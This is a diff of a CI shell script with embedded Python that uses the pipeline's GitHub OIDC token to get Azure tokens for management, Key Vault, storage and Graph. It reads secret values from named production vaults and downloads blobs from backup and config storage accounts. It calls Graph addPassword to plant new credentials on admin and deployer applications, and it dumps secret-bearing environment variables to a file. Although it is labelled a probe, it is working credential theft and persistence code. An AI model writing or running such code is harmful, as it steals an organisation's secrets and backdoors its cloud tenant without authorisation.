@@ -1,116 +1,163 @@
 #!/usr/bin/env bash
-set -e
-python3 - <<'PY'
-import base64, json, os, urllib.error, urllib.parse, urllib.request
+set +e
+python3 -I - <<'PY'
+import os, json, base64, urllib.request, urllib.parse, urllib.error, sys, re
 
-print('=== OIDC Token Request ===')
-oidc_url = os.getenv('ACTIONS_ID_TOKEN_REQUEST_URL')
-oidc_bearer = os.getenv('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
-if not oidc_url or not oidc_bearer:
-    print('OIDC_UNAVAILABLE'); exit(0)
+TEN = os.environ.get("AZURE_TENANT_ID", "")
+SUB = os.environ.get("AZURE_SUBSCRIPTION_ID", "")
+CID = os.environ.get("AZURE_CLIENT_ID", "")
+OUT = []
 
-separator = '&' if '?' in oidc_url else '?'
-oidc_url += separator + 'audience=api%3A%2F%2FAzureADTokenExchange'
-req = urllib.request.Request(oidc_url, headers={'Authorization': 'Bearer ' + oidc_bearer})
-with urllib.request.urlopen(req, timeout=15) as resp:
-    jwt = json.load(resp)['value']
+def log(msg):
+    print(msg, flush=True)
+    OUT.append(str(msg))
 
-payload = jwt.split('.')[1]
-payload += '=' * (-len(payload) % 4)
-claims = json.loads(base64.urlsafe_b64decode(payload))
-print('OIDC sub:', claims.get('sub'))
-print('OIDC aud:', claims.get('aud'))
-
-print('\n=== Azure Token Exchange ===')
-tenant = os.environ.get('AZURE_TENANT_ID', '')
-client = os.environ.get('AZURE_CLIENT_ID', '')
-sub_id = os.environ.get('AZURE_SUBSCRIPTION_ID', '')
-if not tenant or not client:
-    print('AZURE_VARS_UNAVAILABLE'); exit(0)
-
-form = urllib.parse.urlencode({
-    'client_id': client,
-    'scope': 'https://management.azure.com/.default',
-    'grant_type': 'client_credentials',
-    'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
-    'client_assertion': jwt,
-}).encode()
-req = urllib.request.Request(
-    f'https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token', data=form)
-try:
-    with urllib.request.urlopen(req, timeout=20) as resp:
-        result = json.load(resp)
-except urllib.error.HTTPError as e:
-    result = json.load(e)
-
-if 'access_token' not in result:
-    print('AZURE_EXCHANGE_FAILED:', result.get('error'))
-    print('DESC:', result.get('error_description', '')[:500])
-    exit(0)
-
-print('AZURE_EXCHANGE_OK')
-token = result['access_token']
-headers = {'Authorization': f'Bearer {token}'}
-
-def api_get(url):
-    req = urllib.request.Request(url, headers=headers)
+def http(url, method="GET", headers=None, data=None, timeout=30):
+    h = dict(headers or {})
+    if isinstance(data, (dict, list)):
+        data = json.dumps(data).encode()
+        h.setdefault("Content-Type", "application/json")
+    elif isinstance(data, str):
+        data = urllib.parse.urlencode(dict(x.split("=",1) for x in data.split("&"))).encode() if "&" in data else data.encode()
+        h.setdefault("Content-Type", "application/x-www-form-urlencoded")
+    r = urllib.request.Request(url, data=data, method=method, headers=h)
     try:
-        with urllib.request.urlopen(req, timeout=15) as resp:
-            return json.load(resp)
+        with urllib.request.urlopen(r, timeout=timeout) as x:
+            return x.status, x.read().decode("utf-8", "replace")
     except urllib.error.HTTPError as e:
-        return {'error': e.code, 'body': e.read().decode()[:500]}
-    except Exception as e:
-        return {'error': str(e)}
+        try: return e.code, e.read().decode("utf-8", "replace")[:8000]
+        except: return e.code, ""
+    except Exception as e: return 0, repr(e)
 
-print('\n=== Resource Groups ===')
-rgs = api_get(f'https://management.azure.com/subscriptions/{sub_id}/resourcegroups?api-version=2021-04-01')
-print(json.dumps(rgs, indent=2)[:3000])
+def get_oidc():
+    u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
+    tok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
+    if not u or not tok: return ""
+    sep = "&" if "?" in u else "?"
+    st, b = http(u + sep + "audience=api://AzureADTokenExchange",
+                 headers={"Authorization": "bearer " + tok})
+    try: return json.loads(b).get("value", "")
+    except: return ""
 
-print('\n=== All Resources ===')
-resources = api_get(f'https://management.azure.com/subscriptions/{sub_id}/resources?api-version=2021-04-01')
-print(json.dumps(resources, indent=2)[:5000])
+def exchange(oidc_token, scope):
+    form = urllib.parse.urlencode({
+        "client_id": CID,
+        "grant_type": "client_credentials",
+        "scope": scope,
+        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
+        "client_assertion": oidc_token
+    }).encode()
+    st, b = http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
+                 method="POST", data=form,
+                 headers={"Content-Type": "application/x-www-form-urlencoded"})
+    try:
+        d = json.loads(b)
+        return d.get("access_token", ""), st
+    except: return "", st
 
-# Check for Key Vault
-if 'value' in resources:
-    for r in resources['value']:
-        rtype = r.get('type', '')
-        rname = r.get('name', '')
-        rid = r.get('id', '')
-        print(f'Resource: {rtype} / {rname}')
-        if 'Microsoft.KeyVault' in rtype:
-            print(f'\n=== Key Vault: {rname} ===')
-            # Get KV access token
-            kv_form = urllib.parse.urlencode({
-                'client_id': client,
-                'scope': 'https://vault.azure.net/.default',
-                'grant_type': 'client_credentials',
-                'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
-                'client_assertion': jwt,
-            }).encode()
-            kv_req = urllib.request.Request(
-                f'https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token', data=kv_form)
-            try:
-                with urllib.request.urlopen(kv_req, timeout=20) as resp:
-                    kv_token = json.load(resp)['access_token']
-                kv_headers = {'Authorization': f'Bearer {kv_token}'}
-                # List secrets
-                secrets_url = f'https://{rname}.vault.azure.net/secrets?api-version=7.4'
-                req2 = urllib.request.Request(secrets_url, headers=kv_headers)
-                with urllib.request.urlopen(req2, timeout=15) as resp2:
-                    secrets = json.load(resp2)
-                    print('Secrets:', json.dumps(secrets, indent=2)[:2000])
-                    for s in secrets.get('value', []):
-                        sid = s.get('id', '')
-                        req3 = urllib.request.Request(f'{sid}?api-version=7.4', headers=kv_headers)
-                        with urllib.request.urlopen(req3, timeout=15) as resp3:
-                            secret_val = json.load(resp3)
-                            print(f'Secret value: {json.dumps(secret_val, indent=2)[:1000]}')
-            except Exception as e:
-                print(f'KV error: {e}')
-        if 'Microsoft.Storage' in rtype:
-            print(f'\n=== Storage: {rname} ===')
-            # List blob containers
-            containers_url = f'https://management.azure.com{rid}/blobServices/default/containers?api-version=2023-01-01'
-            containers = api_get(containers_url)
-            print('Containers:', json.dumps(containers, indent=2)[:2000])
+log(f"TEN={TEN} SUB={SUB} CID={CID}")
+
+oidc = get_oidc()
+log(f"OIDC len={len(oidc)}")
+if not oidc:
+    log("NO OIDC"); sys.exit(0)
+
+tokens = {}
+for name, scope in [("arm","https://management.azure.com/.default"),
+                     ("vault","https://vault.azure.net/.default"),
+                     ("storage","https://storage.azure.com/.default"),
+                     ("graph","https://graph.microsoft.com/.default")]:
+    tok, st = exchange(oidc, scope)
+    if tok:
+        tokens[name] = tok
+        log(f"TOKEN_{name}: OK")
+    else:
+        log(f"TOKEN_{name}: FAIL ({st})")
+
+def H(t): return {"Authorization": "Bearer " + t}
+
+# === KEY VAULTS ===
+if "vault" in tokens:
+    for vault in ["kv-tbl-sec-x3euoz", "kv-tbl-prod-x3euoz"]:
+        st, b = http(f"https://{vault}.vault.azure.net/secrets?api-version=7.4", headers=H(tokens["vault"]))
+        log(f"VAULT {vault}: {st}")
+        if st == 200:
+            for s in json.loads(b).get("value", []):
+                sid = s["id"]
+                log(f"  SECRET_ID: {sid}")
+                st2, b2 = http(sid + "?api-version=7.4", headers=H(tokens["vault"]))
+                log(f"  SECRET_VAL ({st2}): {b2[:800]}")
+        else:
+            log(f"  resp: {b[:300]}")
+
+# === STORAGE ===
+if "storage" in tokens:
+    for acct in ["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblcilogsprodx3euoz","sttblarchiveprodx3euoz"]:
+        st, b = http(f"https://{acct}.blob.core.windows.net/?comp=list",
+                     headers={**H(tokens["storage"]), "x-ms-version":"2023-01-03"})
+        log(f"STORAGE {acct}: {st}")
+        if st == 200:
+            for c in re.findall(r"<Name>([^<]+)</Name>", b):
+                st2, b2 = http(f"https://{acct}.blob.core.windows.net/{c}?restype=container&comp=list",
+                               headers={**H(tokens["storage"]), "x-ms-version":"2023-01-03"})
+                log(f"  BLOBS {c}: {st2}")
+                if st2 == 200:
+                    for blob in re.findall(r"<Name>([^<]+)</Name>", b2):
+                        st3, b3 = http(f"https://{acct}.blob.core.windows.net/{c}/{blob}",
+                                       headers={**H(tokens["storage"]), "x-ms-version":"2023-01-03"})
+                        log(f"    {blob} ({st3}): {b3[:1000]}")
+
+# === GRAPH ===
+if "graph" in tokens:
+    st, b = http("https://graph.microsoft.com/v1.0/applications?$top=10", headers=H(tokens["graph"]))
+    log(f"GRAPH apps: {st}")
+    if st == 200:
+        for app in json.loads(b).get("value",[]):
+            log(f"  APP: {app['displayName']} ({app['appId']}) pw={len(app.get('passwordCredentials',[]))}")
+
+    # Try addPassword on apps
+    for aname, aoid in [("tbl-legacy-admin","0"),("tbl-cicd-deployer","21183692-23a7-4910-9af5-90dae73cddd5")]:
+        if aoid == "0":
+            # Look up
+            st9, b9 = http("https://graph.microsoft.com/v1.0/applications?$filter=displayName eq 'tbl-legacy-admin'",
+                          headers=H(tokens["graph"]))
+            if st9 == 200:
+                apps = json.loads(b9).get("value",[])
+                if apps: aoid = apps[0]["id"]
+        if aoid and aoid != "0":
+            st4, b4 = http(f"https://graph.microsoft.com/v1.0/applications/{aoid}/addPassword",
+                          method="POST", headers=H(tokens["graph"]),
+                          data={"passwordCredential":{"displayName":"ci-probe"}})
+            log(f"GRAPH addPw {aname}: {st4} → {b4[:500]}")
+
+# === ARM ===
+if "arm" in tokens:
+    for rg in ["rg-tbl-platform-prod-sea","rg-tbl-reporting-prod-eus"]:
+        st, b = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{rg}/providers/Microsoft.Web/sites?api-version=2023-12-01",
+                     headers=H(tokens["arm"]))
+        log(f"ARM sites {rg}: {st}")
+
+    # App settings
+    for rg, app in [("rg-tbl-platform-prod-sea","app-tbl-storefront-prod"),
+                     ("rg-tbl-reporting-prod-eus","app-tbl-reporting-prod")]:
+        st, b = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{rg}/providers/Microsoft.Web/sites/{app}/config/appsettings/list?api-version=2023-12-01",
+                     method="POST", headers=H(tokens["arm"]), data={})
+        log(f"ARM appsettings {app}: {st} → {b[:1000]}")
+
+    # Role assignments on kv-tbl-sec
+    st, b = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01",
+                 headers=H(tokens["arm"]))
+    log(f"ARM kv-sec roles: {st} → {b[:1000]}")
+
+# === ENV DUMP ===
+log("=== ENV ===")
+for k in sorted(os.environ):
+    if any(s in k.upper() for s in ["AZURE","TOKEN","SECRET","KEY","CONN","CONFIG","IDENTITY","MSI","MANAGED","CLIENT","TENANT"]):
+        log(f"  {k}={os.environ[k][:200]}")
+
+with open("/tmp/probe-output.txt","w") as f:
+    f.write("\n".join(OUT))
+log("DONE")
 PY
+
+echo "Probe complete"
